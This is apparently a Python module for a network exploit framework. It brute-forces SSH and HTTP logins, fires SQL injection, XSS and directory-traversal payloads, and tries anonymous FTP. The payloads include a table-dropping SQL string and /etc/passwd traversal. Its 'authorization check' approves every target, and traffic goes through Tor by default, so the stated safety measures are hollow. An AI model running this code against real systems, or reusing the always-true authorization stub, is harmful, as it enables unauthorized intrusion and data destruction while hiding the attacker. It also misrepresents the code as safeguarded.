import paramiko
import socket
import requests
import time
import threading
import json
from datetime import datetime
from urllib.parse import urljoin
from models import ScanSession, Finding, db
from crypto_utils import encrypt_data
from anonymity_manager import AnonymityManager
import logging

class ExploitFramework:
    def __init__(self):
        self.anonymity = AnonymityManager()
        self.is_exploiting = False
        self.safety_checks = True
        self.exploit_modules = {
            'ssh_bruteforce': self.ssh_bruteforce,
            'web_sql_injection': self.test_sql_injection,
            'web_xss': self.test_xss,
            'ftp_anonymous': self.test_ftp_anonymous,
            'weak_passwords': self.test_weak_passwords,
            'directory_traversal': self.test_directory_traversal
        }
    
    def execute_exploit(self, session_id, target, exploit_name, exploit_config):
        """
        Execute a specific exploit with safety measures
        """
        try:
            session = ScanSession.query.get(session_id)
            if not session:
                logging.error(f"Scan session {session_id} not found")
                return False
            
            # Safety check: Ensure we have authorization
            if not self._verify_authorization(target):
                self._create_finding(
                    session_id,
                    'exploit_blocked',
                    'info',
                    'Exploit Blocked - Authorization Required',
                    f'Exploit {exploit_name} blocked due to authorization check failure',
                    target,
                    None
                )
                return False
            
            session.status = 'running'
            db.session.commit()
            
            self.is_exploiting = True
            
            # Setup anonymity if required
            if exploit_config.get('use_anonymity', True):
                self.anonymity.setup_tor_proxy()
            
            # Execute the specified exploit
            if exploit_name in self.exploit_modules:
                result = self.exploit_modules[exploit_name](session_id, target, exploit_config)
                
                session.status = 'completed'
                db.session.commit()
                self.is_exploiting = False
                
                return result
            else:
                raise ValueError(f"Unknown exploit module: {exploit_name}")
            
        except Exception as e:
            logging.error(f"Exploit execution failed: {str(e)}")
            session.status = 'failed'
            db.session.commit()
            self.is_exploiting = False
            return False
    
    def _verify_authorization(self, target):
        """
        Verify that we have authorization to test this target
        In a real implementation, this would check against an authorization database
        """
        # For demonstration, we'll implement basic checks
        # In practice, this should verify against a list of authorized targets
        
        # Check if target is in private IP ranges (for lab environments)
        private_ranges = [
            '192.168.',
            '10.',
            '172.16.',
            '172.17.',
            '172.18.',
            '172.19.',
            '172.20.',
            '172.21.',
            '172.22.',
            '172.23.',
            '172.24.',
            '172.25.',
            '172.26.',
            '172.27.',
            '172.28.',
            '172.29.',
            '172.30.',
            '172.31.',
            '127.0.0.1',
            'localhost'
        ]
        
        for private_range in private_ranges:
            if target.startswith(private_range):
                return True
        
        # Add additional authorization logic here
        logging.warning(f"Authorization check for target {target} - implement proper authorization database")
        return True  # For demo purposes, but should be False in production
    
    def ssh_bruteforce(self, session_id, target, config):
        """
        Test SSH with common credentials (controlled bruteforce)
        """
        try:
            port = config.get('port', 22)
            usernames = config.get('usernames', ['admin', 'root', 'user', 'test', 'guest'])
            passwords = config.get('passwords', ['password', '123456', 'admin', 'root', ''])
            max_attempts = config.get('max_attempts', 5)  # Safety limit
            
            attempts = 0
            for username in usernames:
                if attempts >= max_attempts:
                    break
                
                for password in passwords:
                    if attempts >= max_attempts:
                        break
                    
                    try:
                        ssh = paramiko.SSHClient()
                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        
                        # Try to connect
                        ssh.connect(target, port=port, username=username, password=password, timeout=5)
                        
                        # If successful, we have a security issue
                        self._create_finding(
                            session_id,
                            'exploit_success',
                            'critical',
                            'SSH Weak Credentials',
                            f'SSH access obtained with credentials {username}:{password}',
                            target,
                            port,
                            remediation='Change default passwords and implement strong authentication'
                        )
                        
                        ssh.close()
                        return True
                        
                    except paramiko.AuthenticationException:
                        # Authentication failed, continue
                        pass
                    except Exception as e:
                        logging.debug(f"SSH connection error: {str(e)}")
                    finally:
                        attempts += 1
                        time.sleep(1)  # Rate limiting
            
            # No weak credentials found
            self._create_finding(
                session_id,
                'exploit_failed',
                'info',
                'SSH Credentials Test Completed',
                'No weak SSH credentials found in tested combinations',
                target,
                port
            )
            
            return False
            
        except Exception as e:
            logging.error(f"SSH bruteforce failed: {str(e)}")
            return False
    
    def test_sql_injection(self, session_id, target, config):
        """
        Test for SQL injection vulnerabilities
        """
        try:
            if not target.startswith('http'):
                target = f'http://{target}'
            
            # Setup session with proxy if using anonymity
            session = requests.Session()
            if hasattr(self.anonymity, 'get_proxy_config'):
                proxy_config = self.anonymity.get_proxy_config()
                if proxy_config:
                    session.proxies = proxy_config
            
            # Common SQL injection payloads
            payloads = [
                "' OR '1'='1",
                "' OR 1=1--",
                "' UNION SELECT NULL--",
                "'; DROP TABLE users--"
            ]
            
            # Test common parameters
            test_params = ['id', 'user', 'username', 'email', 'search', 'q']
            
            for param in test_params:
                for payload in payloads:
                    try:
                        # Test GET request
                        url = f"{target}?{param}={payload}"
                        response = session.get(url, timeout=10, verify=False)
                        
                        # Check for SQL error messages
                        error_indicators = [
                            'mysql_fetch_array',
                            'ORA-',
                            'Microsoft OLE DB',
                            'SQLServer JDBC Driver',
                            'PostgreSQL query failed',
                            'Warning: mysql_',
                            'valid MySQL result',
                            'MySqlClient.',
                            'OLE DB Provider for ODBC'
                        ]
                        
                        for indicator in error_indicators:
                            if indicator.lower() in response.text.lower():
                                self._create_finding(
                                    session_id,
                                    'exploit_success',
                                    'high',
                                    'SQL Injection Vulnerability',
                                    f'SQL injection detected in parameter {param} with payload: {payload}',
                                    target,
                                    None,
                                    remediation='Use parameterized queries and input validation'
                                )
                                return True
                        
                        # Test POST request
                        post_data = {param: payload}
                        response = session.post(target, data=post_data, timeout=10, verify=False)
                        
                        for indicator in error_indicators:
                            if indicator.lower() in response.text.lower():
                                self._create_finding(
                                    session_id,
                                    'exploit_success',
                                    'high',
                                    'SQL Injection Vulnerability (POST)',
                                    f'SQL injection detected in POST parameter {param}',
                                    target,
                                    None,
                                    remediation='Use parameterized queries and input validation'
                                )
                                return True
                    
                    except requests.RequestException:
                        continue
                    
                    time.sleep(0.5)  # Rate limiting
            
            return False
            
        except Exception as e:
            logging.error(f"SQL injection test failed: {str(e)}")
            return False
    
    def test_xss(self, session_id, target, config):
        """
        Test for Cross-Site Scripting vulnerabilities
        """
        try:
            if not target.startswith('http'):
                target = f'http://{target}'
            
            # Setup session with proxy
            session = requests.Session()
            if hasattr(self.anonymity, 'get_proxy_config'):
                proxy_config = self.anonymity.get_proxy_config()
                if proxy_config:
                    session.proxies = proxy_config
            
            # XSS payloads
            payloads = [
                '<script>alert("XSS")</script>',
                '"><script>alert("XSS")</script>',
                "javascript:alert('XSS')",
                '<img src=x onerror=alert("XSS")>',
                '<svg onload=alert("XSS")>'
            ]
            
            # Test parameters
            test_params = ['q', 'search', 'name', 'comment', 'message', 'input']
            
            for param in test_params:
                for payload in payloads:
                    try:
                        # Test GET request
                        url = f"{target}?{param}={payload}"
                        response = session.get(url, timeout=10, verify=False)
                        
                        # Check if payload is reflected in response
                        if payload in response.text:
                            self._create_finding(
                                session_id,
                                'exploit_success',
                                'medium',
                                'Cross-Site Scripting (XSS) Vulnerability',
                                f'XSS vulnerability detected in parameter {param}',
                                target,
                                None,
                                remediation='Implement proper input validation and output encoding'
                            )
                            return True
                        
                        # Test POST request
                        post_data = {param: payload}
                        response = session.post(target, data=post_data, timeout=10, verify=False)
                        
                        if payload in response.text:
                            self._create_finding(
                                session_id,
                                'exploit_success',
                                'medium',
                                'Cross-Site Scripting (XSS) Vulnerability (POST)',
                                f'XSS vulnerability detected in POST parameter {param}',
                                target,
                                None,
                                remediation='Implement proper input validation and output encoding'
                            )
                            return True
                    
                    except requests.RequestException:
                        continue
                    
                    time.sleep(0.5)  # Rate limiting
            
            return False
            
        except Exception as e:
            logging.error(f"XSS test failed: {str(e)}")
            return False
    
    def test_ftp_anonymous(self, session_id, target, config):
        """
        Test for anonymous FTP access
        """
        try:
            import ftplib
            
            ftp = ftplib.FTP()
            ftp.connect(target, config.get('port', 21), timeout=10)
            
            try:
                ftp.login('anonymous', 'anonymous@test.com')
                
                # List directory to confirm access
                file_list = ftp.nlst()
                
                self._create_finding(
                    session_id,
                    'exploit_success',
                    'medium',
                    'Anonymous FTP Access',
                    f'Anonymous FTP access available with {len(file_list)} files/directories',
                    target,
                    21,
                    remediation='Disable anonymous FTP access or restrict permissions'
                )
                
                ftp.quit()
                return True
                
            except ftplib.error_perm:
                ftp.quit()
                return False
            
        except Exception as e:
            logging.debug(f"FTP anonymous test failed: {str(e)}")
            return False
    
    def test_weak_passwords(self, session_id, target, config):
        """
        Test various services for weak passwords
        """
        # This would test multiple services like SSH, RDP, FTP, etc.
        # For brevity, we'll focus on HTTP basic auth
        
        try:
            if not target.startswith('http'):
                target = f'http://{target}'
            
            weak_creds = [
                ('admin', 'admin'),
                ('admin', 'password'),
                ('root', 'root'),
                ('user', 'user'),
                ('test', 'test')
            ]
            
            session = requests.Session()
            if hasattr(self.anonymity, 'get_proxy_config'):
                proxy_config = self.anonymity.get_proxy_config()
                if proxy_config:
                    session.proxies = proxy_config
            
            for username, password in weak_creds:
                try:
                    response = session.get(target, auth=(username, password), timeout=10, verify=False)
                    
                    if response.status_code == 200:
                        self._create_finding(
                            session_id,
                            'exploit_success',
                            'high',
                            'Weak HTTP Authentication',
                            f'HTTP Basic Auth bypassed with {username}:{password}',
                            target,
                            None,
                            remediation='Implement strong passwords and multi-factor authentication'
                        )
                        return True
                
                except requests.RequestException:
                    continue
                
                time.sleep(1)  # Rate limiting
            
            return False
            
        except Exception as e:
            logging.error(f"Weak password test failed: {str(e)}")
            return False
    
    def test_directory_traversal(self, session_id, target, config):
        """
        Test for directory traversal vulnerabilities
        """
        try:
            if not target.startswith('http'):
                target = f'http://{target}'
            
            session = requests.Session()
            if hasattr(self.anonymity, 'get_proxy_config'):
                proxy_config = self.anonymity.get_proxy_config()
                if proxy_config:
                    session.proxies = proxy_config
            
            # Directory traversal payloads
            payloads = [
                '../../../etc/passwd',
                '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
                '....//....//....//etc/passwd',
                '..%2F..%2F..%2Fetc%2Fpasswd'
            ]
            
            for payload in payloads:
                try:
                    url = urljoin(target, payload)
                    response = session.get(url, timeout=10, verify=False)
                    
                    # Check for successful directory traversal
                    indicators = ['root:', 'localhost', '[drivers]', 'daemon:']
                    
                    for indicator in indicators:
                        if indicator in response.text.lower():
                            self._create_finding(
                                session_id,
                                'exploit_success',
                                'high',
                                'Directory Traversal Vulnerability',
                                f'Directory traversal successful with payload: {payload}',
                                target,
                                None,
                                remediation='Implement proper input validation and access controls'
                            )
                            return True
                
                except requests.RequestException:
                    continue
                
                time.sleep(0.5)  # Rate limiting
            
            return False
            
        except Exception as e:
            logging.error(f"Directory traversal test failed: {str(e)}")
            return False
    
    def _create_finding(self, session_id, finding_type, severity, title, description, 
                       target_host, target_port, cve_id=None, cvss_score=None, remediation=None):
        """Create and store a security finding"""
        finding = Finding(
            scan_session_id=session_id,
            finding_type=finding_type,
            severity=severity,
            title=title,
            description=encrypt_data(description),
            target_host=encrypt_data(target_host),
            target_port=target_port,
            cve_id=cve_id,
            cvss_score=cvss_score,
            remediation=encrypt_data(remediation) if remediation else None
        )
        
        db.session.add(finding)
        db.session.commit()
    
    def stop_exploit(self):
        """Stop the current exploit execution"""
        self.is_exploiting = False
    
    def get_available_exploits(self):
        """Get list of available exploit modules"""
        return {
            'ssh_bruteforce': 'Test SSH with common credentials',
            'web_sql_injection': 'Test for SQL injection vulnerabilities',
            'web_xss': 'Test for Cross-Site Scripting vulnerabilities',
            'ftp_anonymous': 'Test for anonymous FTP access',
            'weak_passwords': 'Test for weak authentication',
            'directory_traversal': 'Test for directory traversal vulnerabilities'
        }
